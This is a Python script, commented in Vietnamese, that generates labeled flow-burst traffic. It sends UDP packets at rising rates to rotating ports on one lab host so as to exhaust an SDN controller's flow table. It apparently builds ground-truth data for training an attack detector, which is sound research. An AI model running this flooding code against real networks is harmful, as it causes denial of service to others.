#!/usr/bin/env python3
"""A07 — Flow Burst (bùng nổ số flow mới).

Mục đích: ép controller xử lý rất nhiều flow mới → sinh Flow-Mod (hiện
flow_mod_rate luôn = 0). Mỗi gói dùng một cổng đích khác nhau nên là một 5-tuple
mới; nếu switch ở chế độ reactive, mỗi 5-tuple mới = 1 Packet-In + (có thể) 1
Flow-Mod. Đây là đặc trưng phân biệt tấn công cạn tài nguyên bảng flow.

Nhãn 1. Chạy trên vm-attacker, chỉ nhắm vm-web. Có giới hạn tốc độ và thời lượng.
"""
import argparse
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "common"))
from groundtruth import GroundTruth, add_src_arg, assert_target_allowed, random_payload  # noqa: E402

TARGET = "192.168.200.12"
DST_PORT_BASE = 20000      # dải cổng đích để quay vòng
DST_PORT_SPAN = 20000      # 20000..39999

# (name, begin_s, end_s, new_flows_per_sec, label)
PHASES = [
    ("baseline", 0, 120, 0, 0),
    ("P1", 120, 300, 50, 1),
    ("P2", 300, 480, 100, 1),
    ("P3", 480, 660, 200, 1),
    ("recovery", 660, 780, 0, 0),
]
MAX_DURATION = 780


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--run", required=True, help="run_id, vd A07-R1")
    ap.add_argument("--out-dir", default=None)
    add_src_arg(ap, "192.168.200.13")
    args = ap.parse_args()

    assert_target_allowed(TARGET)
    gt = GroundTruth(
        run_id=args.run, scenario="A07", target=TARGET,
        generator="flowburst_a07.py", phases=PHASES,
        default_label=1, out_dir=args.out_dir, source=args.src,
    ).begin()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((args.src, 0))
    payload = random_payload(b"A07")
    start = time.monotonic()
    port_i = 0
    try:
        for name, begin_s, end_s, rate, label in PHASES:
            if begin_s >= MAX_DURATION:
                break
            phase_end = min(end_s, MAX_DURATION)
            while time.monotonic() - start < begin_s:
                time.sleep(0.01)

            phase_sent = 0
            if rate <= 0:
                while time.monotonic() - start < phase_end:
                    time.sleep(0.05)
            else:
                next_send = time.monotonic()
                while time.monotonic() - start < phase_end:
                    now = time.monotonic()
                    if now >= next_send:
                        dport = DST_PORT_BASE + (port_i % DST_PORT_SPAN)
                        port_i += 1
                        sock.sendto(payload(), (TARGET, dport))
                        phase_sent += 1
                        gt.total_sent += 1
                        next_send += 1.0 / rate
                    else:
                        time.sleep(min(0.005, next_send - now))
            print(
                f"PHASE={name} {begin_s}-{phase_end}s "
                f"NEWFLOWS={rate}/s LABEL={label} SENT={phase_sent}",
                flush=True,
            )
    finally:
        sock.close()
        gt.finish()


if __name__ == "__main__":
    main()
